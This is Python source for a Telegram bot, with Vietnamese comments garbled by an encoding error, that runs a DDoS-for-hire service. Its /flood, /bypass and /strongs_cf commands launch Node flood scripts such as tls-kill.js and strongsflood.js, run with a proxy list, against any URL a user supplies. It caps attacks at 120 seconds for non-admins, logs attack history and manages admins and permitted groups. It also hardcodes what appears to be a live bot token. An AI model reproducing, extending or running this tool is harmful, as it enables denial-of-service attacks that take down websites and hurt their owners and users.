import asyncio
import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse
from datetime import datetime
import json
import time
import pytz

ALLOWED_USER_ID = 7371969470  # ID c·ªßa admin m·∫∑c ƒë·ªãnh
TOKEN = '7258312263:AAGIDrOdqp4vyqwMnB4-gALpK0rGjxkH4s4'  # Token c·ªßa bot Telegram
GROUPS_FILE, HISTORY_FILE, ADMINS_FILE = "allowed_groups.json", "attack_history.json", "admins.json"
task_info = {}  # Th√¥ng tin ti·∫øn tr√¨nh t·∫•n c√¥ng
bot_status = True  # Tr·∫°ng th√°i c·ªßa bot, m·∫∑c ƒë·ªãnh l√† b·∫≠t

# Load v√† l∆∞u d·ªØ li·ªáu JSON
def load_json(file, default_value=None):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return default_value if default_value else []

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

# Ki·ªÉm tra n·∫øu ng∆∞·ªùi d√πng l√† admin
def is_admin(user_id):
    admins = load_json(ADMINS_FILE, [])
    return user_id == ALLOWED_USER_ID or user_id in admins

# Ki·ªÉm tra tr·∫°ng th√°i c·ªßa bot
def is_bot_on():
    return bot_status

# Ch·∫°y ti·∫øn tr√¨nh t·∫•n c√¥ng
async def run_attack(url, attack_time, update, method, context):
    if not is_bot_on():
        return await update.message.reply_text("‚ùå Bot hi·ªán t·∫°i ƒëang b·ªã t·∫Øt, kh√¥ng th·ªÉ th·ª±c hi·ªán t·∫•n c√¥ng.")
    
    user_id = update.effective_user.id
    heap_size = "--max-old-space-size=32768"
    commands = {
        'STRONGS-CF': f"node {heap_size} strongsflood.js {url} {attack_time} 5 5 live.txt",
        'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 5 5 live.txt bypass",
        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 5 5 live.txt flood"
    }

    command = commands.get(method)
    if not command:
        return await update.message.reply_text("‚ùå Ph∆∞∆°ng th·ª©c t·∫•n c√¥ng kh√¥ng h·ª£p l·ªá.")

    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    task_info.setdefault(user_id, []).append({
        "url": url, "method": method, "remaining_time": attack_time,
        "task_id": process.pid, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S"),
        "message": None
    })

    # L∆∞u l·ªãch s·ª≠ t·∫•n c√¥ng
    history = load_json(HISTORY_FILE)
    history.append({"user_id": user_id, "username": update.effective_user.username, "url": url, "method": method, "attack_time": attack_time, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S")})
    save_json(HISTORY_FILE, history)

    # Th√¥ng b√°o ngay l·∫≠p t·ª©c v√†o nh√≥m
    group_chat_id = update.message.chat.id
    attack_result = f"üö® T·∫•n c√¥ng v√†o URL {url} ƒë√£ b·∫Øt ƒë·∫ßu.\nPh∆∞∆°ng th·ª©c: {method}\nTh·ªùi gian t·∫•n c√¥ng: {attack_time} gi√¢y\n\nüí¨ Ng∆∞·ªùi d√πng @{update.effective_user.username} üí• ƒëang th·ª±c hi·ªán üìù Vui l√≤ng ki·ªÉm tra tin nh·∫Øn ƒë·∫øn t·ª´ bot ƒë·ªÉ theo d√µi k·∫øt qu·∫£ chi ti·∫øt."
    await context.bot.send_message(group_chat_id, attack_result)

    async def update_remaining_time():
        start_time = time.time()
        end_time = start_time + attack_time
        while time.time() < end_time:
            remaining_time = max(0, int(end_time - time.time()))
            task_text = f"üî¥ Ti·∫øn tr√¨nh t·∫•n c√¥ng:\nURL: {url}, Ph∆∞∆°ng th·ª©c: {method}\n‚è≥ Th·ªùi gian c√≤n l·∫°i: {remaining_time} gi√¢y\n\nüîó Ki·ªÉm tra t√¨nh tr·∫°ng: [Click here](https://check-host.net/check-http?host={parse.urlsplit(url).netloc})"
            
            # G·ª≠i th√¥ng b√°o ri√™ng cho ng∆∞·ªùi d√πng
            if user_id in task_info and task_info[user_id]:
                if not task_info[user_id][0]["message"]:
                    task_info[user_id][0]["message"] = await update.effective_user.send_message(task_text, parse_mode='Markdown')
                else:
                    await task_info[user_id][0]["message"].edit_text(task_text, parse_mode='Markdown')
            
            await asyncio.sleep(3)

    # T·∫°o t√°c v·ª• c·∫≠p nh·∫≠t th·ªùi gian c√≤n l·∫°i
    asyncio.create_task(update_remaining_time())
    await asyncio.sleep(attack_time)

    # Th√¥ng b√°o k·∫øt th√∫c t·∫•n c√¥ng cho ng∆∞·ªùi d√πng
    await update.effective_user.send_message(f"T·∫•n c√¥ng {method} v√†o URL {url} ƒë√£ ho√†n t·∫•t. ‚úÖ")
    
    # X√≥a ti·∫øn tr√¨nh t·∫•n c√¥ng kh·ªèi task_info
    task_info[user_id] = [task for task in task_info[user_id] if task["task_id"] != process.pid]

# L·ªánh /task ƒë·ªÉ hi·ªÉn th·ªã c√°c ti·∫øn tr√¨nh t·∫•n c√¥ng ƒëang ch·∫°y
async def task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in task_info or not task_info[user_id]:
        return await update.message.reply_text("‚ùå Hi·ªán t·∫°i kh√¥ng c√≥ ti·∫øn tr√¨nh t·∫•n c√¥ng n√†o ƒëang ch·∫°y.")
    
    task_text = "üî¥ C√°c ti·∫øn tr√¨nh t·∫•n c√¥ng ƒëang ch·∫°y:\n"
    for task in task_info[user_id]:
        task_text += f"üö® URL: {task['url']}\n" \
                     f"‚öî Ph∆∞∆°ng th·ª©c: {task['method']}\n" \
                     f"‚è≥ Th·ªùi gian c√≤n l·∫°i: {task['remaining_time']} gi√¢y\n" \
                     f"üïí B·∫Øt ƒë·∫ßu: {task['start_time']}\n\n"
    
    await update.message.reply_text(task_text)

# L·ªánh t·∫•n c√¥ng
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_bot_on():
        return await update.message.reply_text("‚ùå Bot hi·ªán t·∫°i ƒëang b·ªã t·∫Øt, kh√¥ng th·ªÉ th·ª±c hi·ªán t·∫•n c√¥ng.")
    
    # Ki·ªÉm tra quy·ªÅn c·ªßa ng∆∞·ªùi d√πng
    if update.message.chat.id not in load_json(GROUPS_FILE) and not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng t√≠nh nƒÉng n√†y. N·∫øu mu·ªën build server bot ri√™ng, vui l√≤ng li√™n h·ªá admin @VanThanhCoder6789.")
    
    # Ki·ªÉm tra c√∫ ph√°p l·ªánh
    if len(context.args) < 2:
        return await help_command(update, context)

    try:
        url, attack_time = context.args[0], int(context.args[1])
        method = 'STRONGS-CF' if '/strongs_cf' in update.message.text else ('bypass' if '/bypass' in update.message.text else 'flood')
        
        # Ki·ªÉm tra th·ªùi gian t·∫•n c√¥ng
        if attack_time > 120 and not is_admin(update.effective_user.id):
            return await update.message.reply_text("‚ö†Ô∏è Th·ªùi gian t·∫•n c√¥ng t·ªëi ƒëa l√† 120 gi√¢y.")
        
        # Th·ª±c hi·ªán t·∫•n c√¥ng
        asyncio.create_task(run_attack(url, attack_time, update, method, context))

    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå ƒê√£ x·∫£y ra l·ªói.")

# L·ªãch s·ª≠ t·∫•n c√¥ng
async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    history = load_json(HISTORY_FILE)
    history_text = "üìù L·ªãch s·ª≠ t·∫•n c√¥ng:\n"
    for entry in history:
        history_text += f"üí• URL: {entry['url']}\n‚öî Ph∆∞∆°ng th·ª©c: {entry['method']}\nüë§ Ng∆∞·ªùi d√πng: @{entry['username']}\n‚è± Th·ªùi gian: {entry['start_time']}\n‚è≥ Th·ªùi gian t·∫•n c√¥ng: {entry['attack_time']} gi√¢y\n\n"
    await update.message.reply_text(history_text)

# D·ª´ng ti·∫øn tr√¨nh t·∫•n c√¥ng
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    subprocess.run("ps aux | grep 'tls-kill.js\\|strongsflood.js' | grep -v grep | awk '{print $2}' | xargs kill -9", shell=True)
    await update.message.reply_text("‚úÖ T·∫•t c·∫£ c√°c ti·∫øn tr√¨nh t·∫•n c√¥ng ƒë√£ b·ªã d·ª´ng.")

# Th√™m nh√≥m v√†o danh s√°ch nh√≥m ƒë∆∞·ª£c ph√©p
async def add_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    try:
        group_id = int(context.args[0])
        allowed_groups = load_json(GROUPS_FILE)
        if group_id in allowed_groups:
            return await update.message.reply_text("‚ùå Nh√≥m n√†y ƒë√£ c√≥ trong danh s√°ch.")
        
        allowed_groups.append(group_id)
        save_json(GROUPS_FILE, allowed_groups)
        await update.message.reply_text(f"‚úÖ Nh√≥m {group_id} ƒë√£ ƒë∆∞·ª£c th√™m v√†o danh s√°ch nh√≥m ƒë∆∞·ª£c ph√©p.")
    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå Vui l√≤ng cung c·∫•p ID nh√≥m h·ª£p l·ªá.")

# Th√™m ng∆∞·ªùi d√πng admin v√†o danh s√°ch
async def add_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    try:
        new_admin_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if new_admin_id in admins:
            return await update.message.reply_text("‚ùå Ng∆∞·ªùi d√πng n√†y ƒë√£ l√† admin.")
        
        admins.append(new_admin_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"‚úÖ Ng∆∞·ªùi d√πng {new_admin_id} ƒë√£ ƒë∆∞·ª£c th√™m v√†o danh s√°ch admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå Vui l√≤ng cung c·∫•p ID ng∆∞·ªùi d√πng h·ª£p l·ªá.")

# X√≥a ng∆∞·ªùi d√πng admin
async def delete_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    try:
        user_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if user_id not in admins:
            return await update.message.reply_text("‚ùå Ng∆∞·ªùi d√πng n√†y kh√¥ng ph·∫£i l√† admin.")
        
        admins.remove(user_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"‚úÖ Ng∆∞·ªùi d√πng {user_id} ƒë√£ ƒë∆∞·ª£c x√≥a kh·ªèi danh s√°ch admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå Vui l√≤ng cung c·∫•p ID ng∆∞·ªùi d√πng h·ª£p l·ªá.")

# X√≥a to√†n b·ªô l·ªãch s·ª≠ t·∫•n c√¥ng
async def delete_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    save_json(HISTORY_FILE, [])
    await update.message.reply_text("‚úÖ To√†n b·ªô l·ªãch s·ª≠ t·∫•n c√¥ng ƒë√£ ƒë∆∞·ª£c x√≥a.")

# L·ªánh b·∫≠t bot
async def on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    global bot_status
    bot_status = True
    await update.message.reply_text("‚úÖ Bot ƒë√£ ƒë∆∞·ª£c b·∫≠t.")

# L·ªánh t·∫Øt bot
async def off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.")
    
    global bot_status
    bot_status = False
    await update.message.reply_text("‚ùå Bot ƒë√£ b·ªã t·∫Øt.")

# L·ªánh gi√∫p ƒë·ª°
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
üåê **L·ªánh Bot - T·∫•n C√¥ng DDoS**:

### L·ªánh d√†nh cho ng∆∞·ªùi d√πng:
1. **/flood [url] [time]** - üåä T·∫•n c√¥ng Flood v√†o URL v·ªõi th·ªùi gian (gi√¢y).
2. **/bypass [url] [time]** - ‚ö°Ô∏è T·∫•n c√¥ng Bypass v√†o URL v·ªõi th·ªùi gian (gi√¢y).
3. **/strongs_cf [url] [time]** - üî• T·∫•n c√¥ng STRONGS-CF v√†o URL v·ªõi th·ªùi gian (gi√¢y).
4. **/task** - üìù Xem c√°c ti·∫øn tr√¨nh t·∫•n c√¥ng ƒëang ch·∫°y.
5. **/help** - ‚ùì Hi·ªÉn th·ªã b·∫£ng h∆∞·ªõng d·∫´n l·ªánh bot.

### L·ªánh ch·ªâ d√†nh cho Admin:
6. **/stop** - ‚õîÔ∏è D·ª´ng t·∫•t c·∫£ ti·∫øn tr√¨nh t·∫•n c√¥ng (ch·ªâ admin m·ªõi c√≥ quy·ªÅn).
7. **/addgroup [group_id]** - üîß Th√™m nh√≥m v√†o danh s√°ch ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng bot (ch·ªâ admin).
8. **/history** - üìú Ki·ªÉm tra l·ªãch s·ª≠ t·∫•n c√¥ng (ch·ªâ admin).
9. **/adduser [user_id]** - üë§ Th√™m ng∆∞·ªùi d√πng v√†o danh s√°ch admin (ch·ªâ admin).
10. **/deleteuser [user_id]** - ‚ùå X√≥a ng∆∞·ªùi d√πng kh·ªèi danh s√°ch admin (ch·ªâ admin).
11. **/deletehistory** - üóëÔ∏è X√≥a to√†n b·ªô l·ªãch s·ª≠ t·∫•n c√¥ng (ch·ªâ admin).
12. **/on** - üîì B·∫≠t bot (ch·ªâ admin).
13. **/off** - üîí T·∫Øt bot (ch·ªâ admin).

---

üõ†Ô∏è **L∆∞u √Ω**:
- üîí C√°c l·ªánh nh∆∞ **`/adduser`**, **`/deleteuser`**, **`/addgroup`**, **`/deletehistory`**, **`/on`**, v√† **`/off`** ch·ªâ c√≥ th·ªÉ s·ª≠ d·ª•ng b·ªüi **Admin**.
- ‚úÖ C√°c l·ªánh t·∫•n c√¥ng nh∆∞ **`/flood`**, **`/bypass`**, **`/strongs_cf`** y√™u c·∫ßu th·ªùi gian t·∫•n c√¥ng ƒë∆∞·ª£c x√°c ƒë·ªãnh v√† URL h·ª£p l·ªá.
- üí¨ S·ª≠ d·ª•ng **/task** ƒë·ªÉ theo d√µi c√°c ti·∫øn tr√¨nh t·∫•n c√¥ng ƒëang ch·∫°y.
- üìÖ **L·ªãch s·ª≠** c√≥ th·ªÉ ƒë∆∞·ª£c xem v·ªõi l·ªánh **/history** (ch·ªâ admin).
- üõë B·∫°n c√≥ th·ªÉ d·ª´ng c√°c ti·∫øn tr√¨nh t·∫•n c√¥ng b·∫±ng l·ªánh **/stop** (ch·ªâ admin).

---

üöÄ **Ch√∫c b·∫°n th√†nh c√¥ng!**
‚ö°Ô∏è **BOT power k√©m kh√¥ng √°p d·ª•ng ƒë·ªëi v·ªõi host tr√¢u b√≤.**
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')


# Kh·ªüi ch·∫°y bot
def main():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("bypass", attack))
    application.add_handler(CommandHandler("strongs_cf", attack))
    application.add_handler(CommandHandler("task", task))  # Th√™m l·ªánh /task
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("addgroup", add_group))
    application.add_handler(CommandHandler("adduser", add_user_admin))
    application.add_handler(CommandHandler("deleteuser", delete_user_admin))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("history", history))
    application.add_handler(CommandHandler("deletehistory", delete_history))
    application.add_handler(CommandHandler("on", on))
    application.add_handler(CommandHandler("off", off))
    application.run_polling()

if __name__ == "__main__":
    main()
